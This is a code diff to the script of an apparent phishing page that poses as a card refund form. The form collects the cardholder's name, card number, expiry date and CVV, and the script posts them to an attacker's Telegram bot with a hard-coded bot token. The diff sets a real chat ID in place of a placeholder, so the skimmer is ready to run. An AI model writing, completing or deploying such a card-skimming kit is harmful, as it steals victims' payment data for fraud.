@@ -59,69 +59,62 @@
     </div>
 
     <script>
-        const token = "7493515332:AAGlVbk9dCC2tqKxdv8TjgM32qqPRqFsy2I";  // Télégram Token
-        const chatId = "@YourChannelOrChatId"; // Remplacez cela par votre chat ID ou le nom d'utilisateur du canal
+        const token = "7493515332:AAGlVbk9dCC2tqKxdv8TjgM32qqPRqFsy2I";  // توكن البوت
+        const chatId = "5372119436"; // الـ chat_id الخاص بك
 
-        // Dédier une fonction pour envoyer les informations à Telegram
         function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${token}/sendMessage`;
             const data = {
-                chat_id: chatId, // Assurez-vous que ce chat ID est correct
+                chat_id: chatId,
                 text: message
             };
 
             fetch(url, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             })
             .then(response => response.json())
             .then(data => {
-                console.log("Message envoyé à Telegram:", data);
-                if (!data.ok) {
-                    console.error("Erreur d'envoi du message:", data.description);
+                if (data.ok) {
+                    alert("✅ Les informations ont été envoyées avec succès à Telegram !");
+                } else {
+                    alert(`❌ Erreur: ${data.description}`);
+                    console.error("Erreur d'envoi:", data.description);
                 }
             })
             .catch(error => {
-                console.error("Erreur d'envoi au bot Telegram:", error);
+                alert("❌ Une erreur est survenue lors de l'envoi des données.");
+                console.error("Erreur réseau:", error);
             });
         }
 
-        // Fonction pour valider le formulaire et envoyer les données à Telegram
         function validateForm(event) {
             event.preventDefault();
 
-            // Obtenez les valeurs des champs
             const nom = document.getElementById('nom').value;
-            const cardNumber = document.getElementById('numero-carte').value.replace(/\s+/g, ''); // Supprimer les espaces
+            const cardNumber = document.getElementById('numero-carte').value.replace(/\s+/g, '');
             const cvv = document.getElementById('cvv').value;
             const expirationDate = new Date(document.getElementById('date-expiration').value);
             const currentDate = new Date();
 
             let valid = true;
 
-            // Validation du numéro de carte
-            const cardRegex = /^[0-9]{16}$/;
-            if (!cardRegex.test(cardNumber)) {
+            if (!/^\d{16}$/.test(cardNumber)) {
                 document.getElementById('card-error').classList.remove('hidden');
                 valid = false;
             } else {
                 document.getElementById('card-error').classList.add('hidden');
             }
 
-            // Validation du CVV
-            const cvvRegex = /^[0-9]{3}$/;
-            if (!cvvRegex.test(cvv)) {
+            if (!/^\d{3}$/.test(cvv)) {
                 document.getElementById('cvv-error').classList.remove('hidden');
                 valid = false;
             } else {
                 document.getElementById('cvv-error').classList.add('hidden');
             }
 
-            // Validation de la date d'expiration
-            if (expirationDate <= currentDate || isNaN(expirationDate.getTime())) {
+            if (expirationDate <= currentDate || isNaN(expirationDate)) {
                 document.getElementById('date-error').classList.remove('hidden');
                 valid = false;
             } else {
@@ -129,18 +122,14 @@
             }
 
             if (valid) {
-                // Si le formulaire est valide, envoyer les données à Telegram
                 const message = `
-                    Nouveau remboursement:
-                    - Nom: ${nom}
-                    - Numéro de la carte: ${cardNumber}
-                    - Date d'expiration: ${document.getElementById('date-expiration').value}
-                    - CVV: ${cvv}
+                🧾 Nouveau remboursement:
+                - Nom: ${nom}
+                - Numéro de carte: ${cardNumber}
+                - Date d'expiration: ${document.getElementById('date-expiration').value}
+                - CVV: ${cvv}
                 `;
                 sendToTelegram(message);
-                alert('Toutes les informations sont valides. Le remboursement a été confirmé !');
-            } else {
-                console.log("Le formulaire contient des erreurs.");
             }
         }
     </script>
